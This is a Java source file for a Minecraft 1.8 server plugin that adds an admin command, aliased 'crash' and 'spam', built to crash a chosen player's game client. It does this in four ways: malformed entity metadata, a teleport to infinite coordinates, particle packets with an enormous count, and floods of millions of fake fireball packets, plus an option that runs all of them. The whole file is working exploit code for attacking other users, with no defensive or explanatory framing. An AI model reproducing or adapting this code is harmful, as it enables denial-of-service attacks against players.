package club.abelix.api.server.base.command;

import club.abelix.api.base.command.BukkitExecutionSession;
import club.abelix.commons.command.NamedCommand;
import club.abelix.commons.command.WithAlias;
import club.abelix.commons.command.condition.WithCondition;
import club.abelix.commons.command.condition.WithPermission;
import club.abelix.commons.command.exception.CommandException;
import club.abelix.commons.command.execution.Executor;
import club.abelix.core.bukkit.HeartBeat;
import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.val;
import net.minecraft.server.v1_8_R3.DataWatcher;
import net.minecraft.server.v1_8_R3.EntityArrow;
import net.minecraft.server.v1_8_R3.EntitySmallFireball;
import net.minecraft.server.v1_8_R3.EnumParticle;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityMetadata;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityVelocity;
import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
import net.minecraft.server.v1_8_R3.PacketPlayOutSpawnEntity;
import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Arrays;
import java.util.EnumSet;
import java.util.concurrent.ThreadLocalRandom;
import java.util.function.Consumer;

@WithAlias("crash")
@WithAlias("spam")
@WithAlias("babah")
@NamedCommand("blackmagic")
public class FuckCommand {

    @Executor
    @WithPermission("command.fuck")
    @WithCondition("disableConsole")
    public static void executor(BukkitExecutionSession session) throws CommandException {
        val data = new CrashData(
                session.getGamer(1).getPlayer(),
                Arrays.copyOfRange(session.getArguments(), 2, session.getArguments().length)
        );

        CrashMethod method;

        try {
            method = CrashMethod.valueOf(session.getArgument(0).toUpperCase());
        } catch (IllegalArgumentException e) {
            session.sendMessage("Invalid crash method. Available methods: " + String.join(", ", Arrays.stream(CrashMethod.values()).map(Enum::name).toList()));
            return;
        }

        HeartBeat.runAsync(() -> {
            try {
                method.getRunner().accept(data);
            } catch (Exception e) {
                HeartBeat.runSync(() -> session.sendMessage(e.getMessage()));
            }
        });
    }

    private record CrashData(Player target, String[] args) {
    }

    @Getter
    @AllArgsConstructor
    private enum CrashMethod {
        DATA_WATCHER(new DataWatcherCrashMethod()),
        POSITION(new PositionCrashMethod()),
        PARTICLE(new ParticleCrashMethod()),
        ENTITY(new EntityCrashMethod()),
        ALL(c -> Arrays.stream(CrashMethod.values()).forEach(crashMethod -> crashMethod.getRunner().accept(c)))
        ;

        final Consumer<CrashData> runner;
    }

    private static final class DataWatcherCrashMethod implements Consumer<CrashData> {

        @Override
        public void accept(CrashData crashData) {
            val target = crashData.target();
            val entityId = crashData.target.getEntityId();
            val nms = ((CraftPlayer) target).getHandle();
            val dw = new DataWatcher(nms);

            for (int i = 0; i < 30; i++) {
                byte id = (byte) i;

                dw.a(id, i);
            }

            val pkt = new PacketPlayOutEntityMetadata(
                    entityId,
                    dw,
                    true
            );

            nms.playerConnection.sendPacket(pkt);
        }
    }

    private static final class PositionCrashMethod implements Consumer<CrashData> {

        private static final PacketPlayOutPosition CACHED = new PacketPlayOutPosition(
                Double.POSITIVE_INFINITY,
                Double.POSITIVE_INFINITY,
                Double.POSITIVE_INFINITY,
                0f,
                0f,
                EnumSet.allOf(PacketPlayOutPosition.EnumPlayerTeleportFlags.class)
        );

        @Override
        public void accept(CrashData crashData) {
            val target = crashData.target;
            val nms = ((CraftPlayer) target).getHandle();

            nms.playerConnection.sendPacket(CACHED);
        }
    }

    private static final class ParticleCrashMethod implements Consumer<CrashData> {

        @Override
        public void accept(CrashData crashData) {
            int iterations;

            try {
                iterations = Integer.parseInt(crashData.args[0]);
            } catch (Exception ignored) {
                throw new IllegalStateException("Invalid number of iterations! /crash PARTICLE <number of iterations> (should not be too high, 100 is usually enough)");
            }

            val target = crashData.target;
            val nms = ((CraftPlayer) target).getHandle();
            val loc = target.getLocation();

            PacketPlayOutWorldParticles packet = new PacketPlayOutWorldParticles(
                    EnumParticle.CLOUD,
                    false,
                    (float) loc.getX(),
                    (float) loc.getY(),
                    (float) loc.getZ(),
                    0.1f,
                    0.1f,
                    0.1f,
                    0.0f,
                    Integer.MAX_VALUE
            );

            int finalIterations = iterations;

            val tasks = 10;

            for (int i = 0; i < tasks; i++) {
                HeartBeat.runAsync(() -> {
                    for (int j = 0; j < finalIterations / tasks; j++) {
                        nms.playerConnection.sendPacket(packet);
                    }
                });
            }
        }
    }

    private static final class EntityCrashMethod implements Consumer<CrashData> {

        @Override
        public void accept(CrashData crashData) {
            int iterations = 5000000; // дефолт, чтобы не кикало за ошибку

            try {
                iterations = Integer.parseInt(crashData.args[0]);
                iterations = Math.min(iterations, 100_000_000); // лимит, чтобы сервер не умер
            } catch (Exception ignored) {}

            val target = crashData.target;
            val bukkitLoc = target.getLocation();
            val world = ((CraftPlayer) target).getHandle().world;
            val nmsPlayer = ((CraftPlayer) target).getHandle();
            val random = ThreadLocalRandom.current();

            val tasks = 20;

            for (int t = 0; t < tasks; t++) {
                int finalIterations = iterations;
                HeartBeat.runAsync(() -> {
                    for (int i = 0; i < finalIterations / tasks; i++) {
                        double offsetX = random.nextDouble(-5, 5);
                        double offsetY = random.nextDouble(0.5, 4);
                        double offsetZ = random.nextDouble(-5, 5);

                        double velX = random.nextDouble(-0.4, 0.4);
                        double velY = random.nextDouble(-0.1, 0.5);
                        double velZ = random.nextDouble(-0.4, 0.4);

                        EntitySmallFireball fireball = new EntitySmallFireball(
                                world,
                                bukkitLoc.getX() + offsetX,
                                bukkitLoc.getY() + offsetY,
                                bukkitLoc.getZ() + offsetZ,
                                velX, velY, velZ
                        );

                        PacketPlayOutSpawnEntity spawn = new PacketPlayOutSpawnEntity(
                                fireball,
                                63
                        );

                        nmsPlayer.playerConnection.sendPacket(spawn);

                        DataWatcher dw = new DataWatcher(fireball);

                        for (int idx = 0; idx < 100; idx++) {
                            dw.a(idx, random.nextInt(256));
                        }

                        dw.a(7, 0xFF);
                        dw.a(8, (byte) 0xFF);

                        PacketPlayOutEntityMetadata meta = new PacketPlayOutEntityMetadata(fireball.getId(), dw, true);
                        nmsPlayer.playerConnection.sendPacket(meta);

                        PacketPlayOutEntityVelocity velPkt = new PacketPlayOutEntityVelocity(
                                fireball.getId(), velX * 3, velY * 3, velZ * 3
                        );
                        nmsPlayer.playerConnection.sendPacket(velPkt);
                    }
                });
            }
        }
    }
}
